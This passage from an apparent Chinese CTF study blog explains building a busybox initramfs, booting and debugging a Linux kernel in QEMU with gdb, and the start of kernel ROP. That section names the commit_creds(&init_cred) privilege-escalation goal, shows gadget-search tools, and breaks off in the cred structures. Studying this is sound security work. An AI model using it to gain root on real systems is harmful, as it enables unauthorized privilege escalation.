class="comment">//超级管理员工具</span></span><br><span class="line">├── sys</span><br><span class="line">└── usr</span><br></pre></td></tr></table></figure>

<p>内存文件系统也存放在磁盘上,通常在&#x2F;boot&#x2F;initrd.img</p>
<p>实际上就是上述目录树打包后的归档文件</p>
<p>这就意味着,kernel开始启动之前,内存文件系统已经被解包并且搬到内存里去了</p>
<p>这就意味着,得有一个东西,它知道磁盘上的文件系统格式比如ext4,并且能正确访问到&#x2F;boot&#x2F;initrd.img,并且能解包.</p>
<p>这个东西就是grub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">启动过程:mbr-&gt;grub-&gt;kernel</span><br></pre></td></tr></table></figure>

<p>内核使用临时文件系统起来之后,临时文件系统的init脚本会规定此阶段内核应该干什么,挂载硬盘就是这时候发生的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/busybox-1.36.1/_install# <span class="built_in">cat</span> init</span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /ktest.ko</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>这里面使用的命令比如insmod就是临时文件系统提供的</p>
<p>如果后续要挂载磁盘首先需要让内核知道磁盘上的文件系统格式,比如ext2</p>
<p>也就是说insmod ext2之后,内核才能识别并访问ext2格式化的磁盘.</p>
<p>即时磁盘上的文件系统中有ext2模块,有insmod命令,但是此时还没有挂载,没法使用</p>
<p>因此只能是临时文件系统提供这个功能</p>
<p>也就是说,内存文件系统为内核提供了一套必要的访问磁盘的工具</p>
<p>至于为什么叫做”内存文件系统”,因为整个initrd.img文件很小,会被全部加载进入内存,因此访问速度很快</p>
<h4 id="制作linux临时文件系统"><a href="#制作linux临时文件系统" class="headerlink" title="制作linux临时文件系统"></a>制作linux临时文件系统</h4><p>可以直接使用busybox</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/add358/busybox.git</span><br><span class="line">cd busybox</span><br></pre></td></tr></table></figure>

<p>然后make menuconfig,</p>
<p>Settings-&gt;Build Options-&gt;Build static binary(no shared libs)选上</p>
<p>这一步的目的是将busybox静态链接,可以脱离glibc环境运行,因为内存文件系统很小,不需要glibc</p>
<p>Applets-&gt;Linux System Utilities-&gt;Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)不选</p>
<p>这一步的目的是设置不挂载网络文件系统,为了精简大小</p>
<p>Applets-&gt;Networking Utilities-&gt;inetd不选</p>
<p>这一步的目的是不使用网络,为了精简大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>make install之后会在当前目录下生成一个<code>_install</code>目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">ls</span></span><br><span class="line">bin  linuxrc  sbin  usr</span><br></pre></td></tr></table></figure>

<p>也就是说,busybox提供了bin,sbin,usr三个目录的功能</p>
<p>usr下面的bin和sbin实际上是_install目录下两个同名目录的链接</p>
<p>然后bin,sbin里面的工具,也全是到bin&#x2F;busybox的链接</p>
<p>也就是说,生成了一个busybox可执行程序,创建了一大堆链接</p>
<p>至于sys,dev等目录他不管,我们借助这个半成品加上这几个目录就可以构造一个临时文件系统了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>

<p>然后在当前目录下创建init脚本,规定内核启动时要干啥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>改一下文件权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>

<p>之后在_install目录打包整个临时文件系统</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install<span class="meta"># find . | cpio -o --format=newc &gt; ../rootfs.img</span></span><br><span class="line"><span class="number">5949</span> blocks</span><br></pre></td></tr></table></figure>

<p>这会在上级目录生成一个rootfs.img归档文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox/_install# <span class="built_in">cd</span> ..</span><br><span class="line">root@Destroyer:/home/dustball/busybox# file rootfs.img</span><br><span class="line">rootfs.img: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>这个文件就可以作为临时文件系统了</p>
<h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>把可以引导的内核镜像bzImage也搬到rootfs.img所在的目录来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/busybox# cp /usr/src/linux-6.7/arch/x86/boot/bzImage .</span><br></pre></td></tr></table></figure>

<p>之后可以用qemu启动内核了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 </span><br></pre></td></tr></table></figure>

<p>如果没起来,报告找不到&#x2F;dev&#x2F;tty,可能是init脚本没有给执行权限</p>
<p>-m指定使用内存大小</p>
<p>-kernel指定内核镜像文件</p>
<p>-initrd指定临时文件系统文件</p>
<p>-append指定启动参数,</p>
<blockquote>
<p>root&#x3D;&#x2F;dev&#x2F;ram,根文件系统也使用临时文件系统 rw可读写</p>
<p>console&#x3D;ttyS0,指定串口终端0,改成tty0或者ttyS1都看不到输出,还不清楚原因</p>
<p>oops&#x3D;panic panic1 指定发生oops异常时,应该触发内核崩溃</p>
<p>nokaslr,方便调试关闭内核地址随机化</p>
</blockquote>
<h4 id="内存文件系统编译进内核"><a href="#内存文件系统编译进内核" class="headerlink" title="内存文件系统编译进内核"></a>内存文件系统编译进内核</h4><p>之前的内核是一个裸核,内存文件系统是单独制作然后用qemu启动的</p>
<p>可以直接编译进内核</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/OnlyLove_/article/details/124565282</span><br></pre></td></tr></table></figure>

<p>坏处是如果想要修改文件系统,需要重新编译内核</p>
<h3 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h3><p>启动内核时加上调试选项-s,这样就会在127.0.0.1:1234上开启监听端口</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot;</span> \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>然后启动,再开一个终端,用gdb就可以远程调试了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>



<h4 id="添加调试信息"><a href="#添加调试信息" class="headerlink" title="添加调试信息"></a>添加调试信息</h4><p>用于引导的bzImage已经去掉了调试信息,如果直接用gdb给start_kernel这种函数下断点,找不到符号</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">No symbol table is loaded.  Use the <span class="string">&quot;file&quot;</span> <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p>vmlinux中保留有调试信息(编译时保留了调试信息比如dwarf5),将其作为调试符号来源</p>
<p>首先需要知道将vmlinux添加到哪里,也就是内核在内存中的地址</p>
<p>在gdb上c一下让调试内核能够自由执行,然后在被调试的内核上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc # cat /proc/iomem | grep &quot;Kernel code&quot;</span><br><span class="line">  01000000-01ffffff : Kernel code</span><br></pre></td></tr></table></figure>

<p>也就是内核基地址在0x01000000</p>
<p>在gdb上添加调试符号(ctrl+C中断内核)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./vmlinux <span class="number">0x01000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;./vmlinux&quot;</span> at</span><br><span class="line">        .text_addr = <span class="number">0x01000000</span></span><br><span class="line">Reading symbols from ./vmlinux...done.</span><br></pre></td></tr></table></figure>

<p>之后就可以在内核函数上下断点了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b start_kernel</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x1e457e0</span>: start_kernel. (<span class="number">2</span> locations)</span><br></pre></td></tr></table></figure>

<p>也可以源码调试内核了</p>
<h4 id="添加内核模块调试信息"><a href="#添加内核模块调试信息" class="headerlink" title="添加内核模块调试信息"></a>添加内核模块调试信息</h4><p>类似的方法,需要知道的是内核模块在内存中的地址,作为调试符号输入的ko模块文件需要保留调试符号</p>
<p>至于如何保留内核模块的调试符号,需要加入gcc的编译选项-g,<code>CFLAGS_MODULE=-g</code></p>
<p>Makefile这样写</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# <span class="built_in">cat</span> Makefile</span><br><span class="line">obj-m += ktest.o</span><br><span class="line"></span><br><span class="line">KDIR = /usr/src/linux-6.7</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">        $(MAKE) -C $(KDIR) M=$(PWD) modules CFLAGS_MODULE=-g</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">        <span class="built_in">rm</span> -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure>

<p>新编译好的内核模块,注意放到<code>_install</code>下面之后重新cpio打包</p>
<p>给内核模块添加调试符号,首先需要知道该模块被加载到内存的地址</p>
<p>在gdb上c一下让内核继续</p>
<p>然后在被调试的内核上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc <span class="meta"># cat /proc/modules</span></span><br><span class="line">ktest <span class="number">12288</span> <span class="number">0</span> - Live <span class="number">0xffffffffc0000000</span> (O)</span><br></pre></td></tr></table></figure>

<p>也就是说内核模块ktest在0xffffffffc0000000</p>
<p>下面从gdb上为其加载符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file ./ktest.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;./ktest.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from ./ktest.ko...done.</span><br></pre></td></tr></table></figure>

<p>之后就可以下断点,源码调试了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b ko_test_init</span><br><span class="line">Breakpoint 2 at 0xffffffffc0000000: file /home/dustball/kd/ktest.c, line 7.</span><br></pre></td></tr></table></figure>











<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><h2 id="内核ROP"><a href="#内核ROP" class="headerlink" title="内核ROP"></a>内核ROP</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>用户态ROP利用gadget构造<code>system(&quot;/bin/sh&quot;)</code></p>
<p>内核ROP利用gadget构造<code>commit_creds(&amp;init_cred)</code></p>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p>用户态pwn题常用ROPgadget</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/pwn2security/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0x00000000000010d5</span> : jmp rsp</span><br><span class="line">root@Destroyer:/home/dustball/kd# ROPgadget --binary /usr/src/linux<span class="number">-6.7</span>/vmlinux --only <span class="string">&quot;jmp&quot;</span> | grep rsp</span><br><span class="line"><span class="number">0xffffffff81220783</span> : jmp rsp</span><br></pre></td></tr></table></figure>

<p>但是从内核vmlinux中找gadget比较慢</p>
<h4 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h4><p>类似于ROPgadget,但是听说速度快点,没有验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/home/dustball/kd# ropper -f /usr/src/linux-6.7/vmlinux --search <span class="string">&quot;jmp rsp&quot;</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 88%</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: jmp rsp</span><br><span class="line">[INFO] File: /usr/src/linux-6.7/vmlinux</span><br><span class="line">0xffffffff81220783: jmp rsp;</span><br></pre></td></tr></table></figure>

<p>ropper的semantic功能,可以进行简单的静态语义分析,找到令rax&#x3D;0这种gadget</p>
<h4 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h4><p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">linux&#x2F;scripts&#x2F;extract-vmlinux at master · torvalds&#x2F;linux · GitHub</a></p>
<p>bzImage是一个经过压缩的内核,如果想要寻找gadget,必须使用一个未被压缩的elf文件,也就是vmlinux</p>
<p>如果题目给出了一个bzImage,可以用extract-vmlinux提取vmlinux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

























<h3 id="cred结构"><a href="#cred结构" class="headerlink" title="cred结构"></a>cred结构</h3><p>cred结构体管理进程权限,用户id等信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux/include/linux/cred.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __put_cred(<span class="keyword">struct</span> cred *);</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">exit_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">get_task_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">cred_alloc_blank</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_exec_creds</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">abort_creds</span><span class="params">(<span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="keyword">struct</span> cred *<span class="title function_">override_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">revert_creds</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">change_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override</span><span class="params">(<span class="keyword">struct</span> cred *, u32)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_security_override_from_ctx</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">set_create_files_as</span><span class="params">(<span class="keyword">struct</span> cred *, <span class="keyword">struct</span> inode *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">cred_fscmp</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> cred *, <span class="type">const</span> <span class="keyword">struct</span> cred *)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>函数实现和<code>init_cred</code>这个预定义对象都在<code>linux/kernel/cred.c</code>中实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_UID KUIDT_INIT(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_ROOT_GID KGIDT_INIT(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 